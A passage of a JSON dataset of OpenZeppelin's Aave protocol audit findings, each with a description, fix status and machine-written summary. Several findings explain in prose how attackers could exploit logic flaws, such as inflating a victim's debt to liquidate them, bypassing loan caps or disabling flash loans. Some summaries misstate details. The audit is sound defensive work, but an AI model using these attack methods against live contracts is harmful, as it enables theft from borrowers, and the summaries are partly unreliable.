      "summary": "\nThe Aave protocol requires all loans to be backed by more than 100% collateral in other asset pools. To maintain this condition, there is a safety mechanism that allows anyone to repay loans that are at risk of becoming insolvent. This encourages arbitrageurs to improve the health of the loans. However, there are conditions where the safety mechanism behaves counter-productively and takes at-risk loans and actively pushes them into insolvency.\n\nThe diagram provided shows the different regions of the loan. Those in the green region above the liquidation threshold are fully collateralized, while those in the red region are insolvent. Those in the purple region are under-collateralized and anyone can repay some of their debt in exchange for collateral at better-than-market rates. This process can never cause a borrower to cross the liquidation line, but if the leftover debt is more than the leftover collateral after a liquidation event, the user is insolvent.\n\nIf the liquidation bonus is 1.05 and the close factor is 0.5, when a borrower's debt rises to at least 95.2% of the value of their collateral, the liquidations start increasing their debt-to-collateral ratio. At 97.6%, it is possible for a liquidation to force them into insolvency.\n\nTo address this risk, it may be useful to run off-chain monitoring of all parameters, along with auto-liquidation mechanisms. The Aave team also acknowledges the issue and plans to challenge it with automated liquidation through decentralized exchanges and an insurance fund to cover liquidation risk.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11603",
      "title": "[H07] Users cannot fixed-rate borrow from a reserve no longer containing their collateral",
      "impact": "HIGH",
      "content": "To prevent abuses in the protocol, borrowing at a fixed rate (from the same reserve where the borrower deposited collateral) is only allowed if the amount being borrowed is greater than the collateral. This restriction is implemented within the `borrow` function on [lines 216 to 221 of `LendingPool.sol`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L216-221).\n\n\nHowever, the restriction currently disallows users borrowing at a fixed rate from a reserve where they *previously* had collateral (but no longer do). After a user withdraws all collateral from a reserve, the system does not automatically toggle to `false` the [`isUserUseReserveAsCollateralEnabled` flag](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/libraries/CoreLibrary.sol#L35). When the user attempts to borrow from that reserve, the [condition in line 220](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L219) will fail, thus reverting the transaction. As a result, the user is unable to borrow from this reserve even if they are not currently holding any collateral in it.\n\n\nConsider programmatically toggling to `false` the [`useAsCollateral` flag](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/libraries/CoreLibrary.sol#L35) once a user has withdrawn all collateral from a reserve.\n\n\n**Update**: *After applying a patch in [MR#74](https://gitlab.com/aave-tech/dlp/contracts/merge_requests/74/diffs), the Aave team correctly pointed out that we misinterpreted the functions behavior and this is not an issue. The fix will still remain in place, and the development team will include relevant test cases to programmatically confirm this is indeed not an issue.*",
      "summary": "\nThis bug report is about a restriction implemented within the `borrow` function on lines 216 to 221 of `LendingPool.sol` which prevents users from borrowing at a fixed rate from a reserve where they previously had collateral (but no longer do). When the user attempts to borrow from that reserve, the condition in line 220 will fail, thus reverting the transaction. As a result, the user is unable to borrow from this reserve even if they are not currently holding any collateral in it.\n\nThe suggested solution is to programmatically toggle to `false` the `useAsCollateral` flag once a user has withdrawn all collateral from a reserve.\n\nAfter applying a patch in MR#74, the Aave team correctly pointed out that the team misinterpreted the functions behavior and this is not an issue. The fix will still remain in place, and the development team will include relevant test cases to programmatically confirm this is indeed not an issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11602",
      "title": "[H06] It is impossible to rebalance another accounts fixed borrow rate",
      "impact": "HIGH",
      "content": "In the [`rebalanceFixedBorrowRate` function](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L493) of the `LendingPool` contract, the call to [`core.updateUserFixedBorrowRate`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L537) is executed passing the `msg.sender` address as argument. As a consequence, successful rebalance calls will only ever update the fixed borrow rates of the caller, rather than the target address defined by the `_user` parameter. This breaks the intended feature of being able to rebalance other accounts.\n\n\nConsider changing the `msg.sender` address used in [line 537](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L537) to `_user`. Related issues that must also be taken into consideration are [**[C04] Rogue borrower can manipulate other accounts borrow balance**](#c04) and [**[H09] Fixed-rate loans can be repeatedly rebalanced**](#h09).\n\n\n**Update**: *Fixed in [MR#61](https://gitlab.com/aave-tech/dlp/contracts/merge_requests/61/diffs).*",
      "summary": "\nThis bug report is regarding the `rebalanceFixedBorrowRate` function of the `LendingPool` contract. The issue is that when the function is called, the `msg.sender` address is being passed as an argument instead of the target address defined by the `_user` parameter. This means that successful rebalance calls will only ever update the caller's fixed borrow rates, rather than the intended target address. This breaks the intended feature of being able to rebalance other accounts.\n\nThe suggested solution is to change the `msg.sender` address used in line 537 to `_user`. Additionally, two related issues must also be taken into consideration, which are \"C04: Rogue borrower can manipulate other account's borrow balance\" and \"H09: Fixed-rate loans can be repeatedly rebalanced\".\n\nThe issue has been fixed in Merge Request #61.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11601",
      "title": "[H05] Maximum size of fixed-rate loans can be bypassed",
      "impact": "HIGH",
      "content": "The [`borrow` function](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L175) of the `LendingPool` contract attempts to set a hard cap on the size of fixed-rate loans. The limit depends on the reserves available liquidity, and is implemented [solely for fixed-rate loans](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L230). An attack vector that allows any borrower to bypass the limit has been identified. First, the borrower takes out an arbitrarily large loan at a variable rate. Afterwards, the borrower takes out a second loan on the same reserve, even for an amount of zero  but this time [setting the interest rate mode](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L178) to fixed. Effectively, the borrower obtained an arbitrarily large loan at a fixed rate. Note that this operation can be carried out by a smart contract in a single transaction. To prevent this particular issue, consider tightening the restrictions to switch from variable to fixed rate loans. Nonetheless, we understand that this issue should not be analyzed in isolation. The simplicity of the attack vector described stems from larger shortcomings at the design level of the Aave protocol and how it handles fixed and variable rate loans. Refer to the [**[N03] Fixed interest rate loans feature is loosely encapsulated**](#n03) issue for more details.\n\n\n**Update**: *Not an issue. In Aaves words:*\n\n\n\n> \n>  The goal of the maximum size enforcement on stable- rate loans is to avoid having borrowers taking liquidity at a rate that is too competitive. In fact, there is a fundamental difference in the two scenarios of a) taking a stable-rate loan directly and b) taking a variable-rate loan, and switching to stable. The difference is in the interest rate. In case a) in fact, without a hard cap on the loan size, borrowers are theoretically able to snatch the whole liquidity at a very competitive rate, as the stable rate only increases after the loan has been taken. In scenario b), on the other hand, the loan at variable rate can be arbitrarily big, as it poses no issues on the interest rate (variable rates increase as borrowers take more liquidity). In scenario b) also, when a user borrows at variable it might cause the stable rate to rise as well, especially if the loan is of a relevant size. Hence in this case a rate swap poses no issues, as the borrower would swap to the most recent, increased stable rate, rather than to the lower stable rate that he would have been able to benefit if he would have borrowed with a stable rate directly.\n> \n> \n>",
      "summary": "\nThis bug report is about the `borrow` function of the `LendingPool` contract of the Aave protocol. This function attempts to set a hard cap on the size of fixed-rate loans, depending on the reserves available liquidity. It was identified that any borrower can bypass this limit by taking out an arbitrarily large loan at a variable rate, then taking out a second loan on the same reserve (even for an amount of zero) and setting the interest rate mode to fixed. This allows the borrower to obtain an arbitrarily large loan at a fixed rate in a single transaction. To prevent this issue, the restrictions to switch from variable to fixed rate loans should be tightened. Additionally, the simplicity of the attack vector is due to larger shortcomings at the design level of the Aave protocol and how it handles fixed and variable rate loans. After further review, it was found that this issue should not be analyzed in isolation, as borrowers are able to swap to the most recent, increased stable rate, rather than to the lower stable rate that they would have been able to benefit if they borrowed with a stable rate directly.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11600",
      "title": "[H04] Liquidators cannot reclaim underlying asset when there is enough liquidity",
      "impact": "HIGH",
      "content": "When calling the [`liquidationCall` function](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L574) to liquidate a borrow position, liquidators can choose to get the collateral either by reclaiming the aTokens or the underlying asset. This is indicated by the `_receiveAToken` boolean parameter of the function, where `false` means the caller is willing to receive the underlying asset. In this scenario, the protocol will first attempt to [validate whether there is enough liquidity in the collaterals reserve](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPoolLiquidationManager.sol#L128-133), which should be achieved by [comparing](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPoolLiquidationManager.sol#L130) the available liquidity and the maximum amount of collateral to liquidate.\n\n\nHowever, as the comparison is inverted, the function will return an error when there is enough liquidity to proceed with the liquidation. Specifically, [a `LiquidationErrors.NOT_ENOUGH_LIQUIDITY` error](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPoolLiquidationManager.sol#L131) is returned when `currentAvailableCollateral &gt;= maxCollateralToLiquidate`.\n\n\nWhile this issue does not pose a security risk on its own, the erroneous comparison breaks an entire feature, preventing liquidators from liquidating a position and getting the underlying asset in exchange. It should be noted that this issue could have been prevented with more thorough unit testing, but only tests where `_receiveAToken` is `true` are currently included (see [`LiquidationCall.spec.js`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/test/LiquidationCall.spec.ts)).\n\n\nConsider inverting the mentioned comparison so that `liquidationCall` returns an error when `currentAvailableCollateral &lt; maxCollateralToLiquidate`. Once the fix is applied, it is highly advisable to add related unit tests to ensure the behavior is expected. Moreover, the new tests should help prevent this issue from being reintroduced in future changes to the code base.\n\n\n**Update**: *Fixed in [MR#73](https://gitlab.com/aave-tech/dlp/contracts/merge_requests/73/diffs).*",
      "summary": "\nA bug was discovered in the `liquidationCall` function of the LendingPool contract, which prevents liquidators from liquidating a position and receiving the underlying asset in exchange. The bug occurs when the `_receiveAToken` boolean parameter is set to `false`, as the protocol attempts to validate the available liquidity and the maximum amount of collateral to liquidate. However, due to an inverted comparison, the function returns an error when there is enough liquidity to proceed with the liquidation. \n\nThe bug does not pose an immediate security risk, but it does break the feature of allowing liquidators to receive the underlying asset. This could have been prevented with more thorough unit testing, but only tests where `_receiveAToken` is `true` are currently included. To fix the issue, the comparison should be inverted so that an error is returned when `currentAvailableCollateral < maxCollateralToLiquidate`. Additionally, related unit tests should be added to ensure the behavior is expected and to help prevent the bug from being reintroduced in the future. The bug has since been fixed in Merge Request #73.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11599",
      "title": "[H03] Deactivated collateral reserve can be used in liquidation",
      "impact": "HIGH",
      "content": "All asset reserves in the Aave protocol can be deactivated by a high-privileged account. When a reserve is deactivated, no actions should be allowed to be executed over it. This validation is implemented by means of the [`onlyActiveReserve` modifier](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L71).\n\n\nThe [`liquidationCall` function](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L574) in the `LendingPool` contract *does* use this modifier, but only to validate that the reserve specified in the `_reserve` argument is active. However, no similar validations are in place for the reserve address passed in the `_collateral` argument. As a consequence, a liquidation can be executed over a collateral reserve that is expected to be deactivated and suffer no modifications at all. Furthermore, this issue is aggravated by the fact that the [`LiquidationCall` event](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L599) does not log which collateral reserve is being affected by the liquidation, hindering off-chain clients task of effectively tracking modifications to a deactivated collateral reserve.\n\n\nConsider preventing modifications to a deactivated collateral reserve via the `liquidationCall` function. This can be achieved by validating that the address passed in the `_collateral` argument corresponds to an active reserve.\n\n\n**Update**: *Fixed in [MR#64](https://gitlab.com/aave-tech/dlp/contracts/merge_requests/64/diffs).*",
      "summary": "\nThis bug report is about the Aave protocol, which is a decentralized lending platform. The issue is that when a reserve is deactivated, no actions should be allowed to be executed over it. However, the `liquidationCall` function in the `LendingPool` contract does not have similar validations in place for the reserve address passed in the `_collateral` argument. This means that a liquidation can be executed over a collateral reserve that is expected to be deactivated, which is a problem. Furthermore, the `LiquidationCall` event does not log which collateral reserve is being affected by the liquidation, making it difficult for off-chain clients to track modifications to a deactivated collateral reserve. \n\nThe solution to this issue is to prevent modifications to a deactivated collateral reserve via the `liquidationCall` function by validating that the address passed in the `_collateral` argument corresponds to an active reserve. This has since been fixed in MR#64.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11598",
      "title": "[H02] Anyone can disable the flash loan feature",
      "impact": "HIGH",
      "content": "The Aave protocol allows borrowers to take out a special type of loan that must be repaid (along with a fee) in the same transaction. This functionality is implemented in the [`flashLoan` function](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L602) of the `LendingPool` contract. Among the preconditions checked before effectively emitting the loan, the function [validates in a `require` statement](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L624) that the available liquidity matches the actual balance of the `LendingPoolCore` contract. From [the comment above](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L622) the check, this is done for added security. Yet, this `require` statement allows anyone to permanently disable the entire flash loan mechanism.\n\n\nAll a malicious user would need to do to effectively conduct the attack would be to send a small amount of assets to the `LendingPoolCore` contract. As a consequence, the balance of the contract would be increased without increasing the available liquidity of the protocol. The mismatch would disable the flash loan feature for a reserve, as the `require` statement in [line 624](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L624) would inevitably fail. It should be noted that to disable the flash loan for the Ether reserve, the attacker [must send the ETH from a contract](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPoolCore.sol#L646-650).\n\n\nSince the [validation in line 624 of `LendingPool.sol`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L624) does not appear to be mandatory to ensure the correct behavior of the `flashLoan` function, consider removing it.\n\n\n**Update**: *Fixed in [MR#53](https://gitlab.com/aave-tech/dlp/contracts/merge_requests/53/diffs).*",
      "summary": "\nThis bug report is about the Aave protocol, which allows borrowers to take out a special type of loan. The loan must be repaid (along with a fee) in the same transaction. The functionality is implemented in the `flashLoan` function of the `LendingPool` contract. A precondition checked before emitting the loan is that the available liquidity matches the actual balance of the `LendingPoolCore` contract. This is done for added security. \n\nHowever, this `require` statement can be exploited by malicious users. All they would need to do is send a small amount of assets to the `LendingPoolCore` contract. This would increase the balance of the contract without increasing the available liquidity of the protocol, causing the `require` statement to fail and disabling the flash loan feature for a reserve. For the Ether reserve, the attacker must send the ETH from a contract.\n\nTherefore, it is suggested that the validation in line 624 of `LendingPool.sol` be removed, as it does not appear to be mandatory to ensure the correct behavior of the `flashLoan` function. This has since been fixed in the Merge Request #53.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11597",
      "title": "[H01] Lack of access controls",
      "impact": "HIGH",
      "content": "Contracts [`LendingPoolAddressesProvider`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/configuration/LendingPoolAddressesProvider.sol) and [`NetworkMetadataProvider`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/configuration/NetworkMetadataProvider.sol) include several setter functions that allow the caller to change addresses of fundamental contracts of the protocol and modify system-wide parameters. The main purpose of these functions is to allow upgrades in the protocols logic. However, none of these functions currently implement any access control mechanisms, thus allowing anyone to execute them. Affected functions are listed below.\n\n\nIn `LendingPoolAddressesProvider` contract: [`setLendingPool`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/configuration/LendingPoolAddressesProvider.sol#L40), [`setInterestRateStrategy`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/configuration/LendingPoolAddressesProvider.sol#L50), [`setLendingPoolCore`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/configuration/LendingPoolAddressesProvider.sol#L61), [`setLendingPoolConfigurator`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/configuration/LendingPoolAddressesProvider.sol#L71), [`setLendingPoolManager`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/configuration/LendingPoolAddressesProvider.sol#L81), [`setLendingPoolDataProvider`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/configuration/LendingPoolAddressesProvider.sol#L91), [`setNetworkMetadataProvider`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/configuration/LendingPoolAddressesProvider.sol#L101), [`setLendingPoolParametersProvider`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/configuration/LendingPoolAddressesProvider.sol#L111), [`setPriceOracle`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/configuration/LendingPoolAddressesProvider.sol#L122), [`setLendingRateOracle`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/configuration/LendingPoolAddressesProvider.sol#L132), [`setFeeProvider`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/configuration/LendingPoolAddressesProvider.sol#L142) and [`setLendingPoolLiquidationManager`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/configuration/LendingPoolAddressesProvider.sol#L152).\n\n\nIn `NetworkMetadataProvider` contract: [`setBlocksPerYear`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/configuration/NetworkMetadataProvider.sol#L16) and [`setEthereumAddress`](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/configuration/NetworkMetadataProvider.sol#L25).\n\n\nThe Aave team acknowledges the lack of access controls for these extremely sensitive features (with inline comments in the code that read `// TODO: add access control rules under DAO`), and is set out to build a governance system that would be the only actor allowed to trigger them. We must highlight that such a governance system is currently not implemented and was left entirely out of the scope of this audit.\n\n\nRegardless of the nature of the access control mechanisms chosen, it must be stressed that the system should not be put in production without the necessary restrictions (and related unit tests) in place.\n\n\n**Update**: *Fixed in [MR#52](https://gitlab.com/aave-tech/dlp/contracts/merge_requests/52/diffs) by adding the missing `onlyOwner` modifiers. According to the Aave team:*\n\n\n\n> \n>  Ownership of these contracts will be assigned upon deployment to the correspondent governance infrastructure.\n> \n> \n>",
      "summary": "\nThis bug report is about two contracts - LendingPoolAddressesProvider and NetworkMetadataProvider - which are part of the Aave protocol. Both contracts have functions that allow the caller to change addresses of fundamental contracts of the protocol and modify system-wide parameters. The main purpose of these functions is to allow upgrades in the protocols logic. However, these functions do not currently have any access control mechanisms, meaning anyone can call them. \n\nAave acknowledges the lack of access controls for these sensitive features, and plans to build a governance system which would be the only actor allowed to trigger them. However, such a governance system is not yet implemented and was left out of the scope of the audit. It is important to note that the system should not be put in production until the necessary restrictions and related unit tests are in place.\n\nThe issue has since been fixed in Merge Request #52, which added the missing onlyOwner modifiers. Ownership of these contracts was then assigned to the correspondent governance infrastructure.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11596",
      "title": "[C05] Loans of Ether cannot be repaid",
      "impact": "HIGH",
      "content": "Any user that has taken out a loan in the Aave protocol should be able to repay it by calling the [`repay` function](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L329) of the `LendingPool` contract. However, a flaw in this function makes it (typically) impossible to repay an Ether loan.\n\n\nDuring the process of repaying an Ether loan the caller is expected to send Ether along with the transaction. That Ether should be split in two, to first pay the origination fee and then to pay down the loan. These operations are executed in lines [375](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L375) and [412](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L412). Both transfers are sent to the `LendingPoolCore` contract, which forwards the fee to a fee collection address during the first transfer. Even though the `LendingPoolCore` contract is the destination in both cases, it [expects to receive the repayment component](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L375) in the second transfer. Consequently, the `LendingPool` contract will (typically) have insufficient Ether to complete the second transfer, which will cause the entire transaction to revert.\n\n\nConsider either returning the excess ether to the `LendingPool` contract in the [`transferToFeeCollectionAddres` function](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPoolCore.sol#661) or recognizing if Ether was sent with the `repay` function and forwarding the exact amounts in both transfers.\n\n\n**Update**: *Fixed in [MR#48](https://gitlab.com/aave-tech/dlp/contracts/merge_requests/48/diffs). However, note that an [erroneous inline comment](https://gitlab.com/aave-tech/dlp/contracts/merge_requests/48/diffs#f32d1b0823e1b657d11caa63b3c186b8912d8067_425_444) has been introduced stating sending the total msg.value if the transfer is ETH. In this case, when the function executes an ETH transfer, only the amount `msg.value.sub(vars.originationFee)` is transferred.*",
      "summary": "\nThis bug report concerns the repayment of an Ether loan taken out from the Aave protocol. The caller of the [`repay` function](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L329) of the `LendingPool` contract is expected to send Ether along with the transaction, which should be split in two to first pay the origination fee and then to pay down the loan. However, the `LendingPool` contract [expects to receive the repayment component](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L375) in the second transfer, but typically there is insufficient Ether to complete the second transfer, which causes the entire transaction to revert.\n\nThe bug has since been fixed in [MR#48](https://gitlab.com/aave-tech/dlp/contracts/merge_requests/48/diffs) with the `LendingPoolCore` contract now either returning the excess ether to the `LendingPool` contract in the [`transferToFeeCollectionAddres` function](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPoolCore.sol#661) or recognizing if Ether was sent with the `repay` function and forwarding the exact amounts in both transfers. However, an erroneous inline comment was introduced stating sending the total msg.value if the transfer is ETH. In this case, when the function executes an ETH transfer, only the amount `msg.value.sub(vars.originationFee)` is transferred.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Aave Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/aave-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11595",
      "title": "[C04] Rogue borrower can manipulate other accounts borrow balance",
      "impact": "HIGH",
      "content": "The [`rebalanceFixedBorrowRate` function](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L493) of the `LendingPool` contract is intended to allow anyone to rebalance the fixed interest rate of a borrower when certain requirements are met. All the caller needs to specify is the reserve (in the `_reserve` parameter) and the borrowers account to be rebalanced (in the `_user` parameter).\n\n\n[When querying the borrow balances](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L500-502), the function calls the [`getUserBorrowBalances` function](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPoolCore.sol#L499) mistakenly passing `msg.sender` as the argument. Consequently, the `compoundedBalance` and `balanceIncrease` local variables will hold the callers borrow balances, and not those of the account to be rebalanced (*i.e.* the address in `_user`). From then on, `balanceIncrease` is used to update the reserves data. It is fundamental to note that on [line 514](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L514) the [`increaseUserPrincipalBorrowBalance` function](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPoolCore.sol#L288) increases the `_user`s borrow balance by `balanceIncrease`.\n\n\nAny rogue borrower whose [`compoundedBalance` is greater than zero](https://gitlab.com/aave-tech/dlp/contracts/blob/1f8e5e65a99a887a5a13ad9af6486ebf93f57d02/contracts/lendingpool/LendingPool.sol#L505-507) can leverage this critical vulnerability to manipulate another borrowers borrow balance. An attacker holding a large borrow can call `rebalanceFixedBorrowRate` with the victims address as the `_user` parameter. Thus increasing the victims principal borrow balance.\n\n\nThe attacker can further benefit by particularly targeting accounts close to being liquidated. The increase in their borrow balance would effectively push victims into a liquidatable position, allowing the attacker to liquidate them. To prevent front-runs from other liquidators, this attack can be conducted in a single atomic transaction through a malicious contract that first increases the victims borrow balance and then liquidates them.\n\n\nA second attack vector allows rogue borrowers to distort their accrued interest. They can call the `rebalanceFixedBorrowRate` function passing their account in the `_user` parameter, from an account with a very small borrow. This would effectively update their own `lastUpdateTimestamp` without accruing nearly as much interest as they should actually accrue.\n\n\nTo prevent malicious borrowers from exploiting this vulnerability, consider replacing `msg.sender` with `_user` as the argument passed to the `getUserBorrowBalances` function. Please note that this issue is closely tied to critical issue [**[H09] Fixed-rate loans can be repeatedly rebalanced**](#h09) and high severity issue [**[H06] It is impossible to rebalance another accounts fixed borrow rate**](#h06).\n\n\n**Update**: *Fixed in [MR#61](https://gitlab.com/aave-tech/dlp/contracts/merge_requests/61/diffs).*",
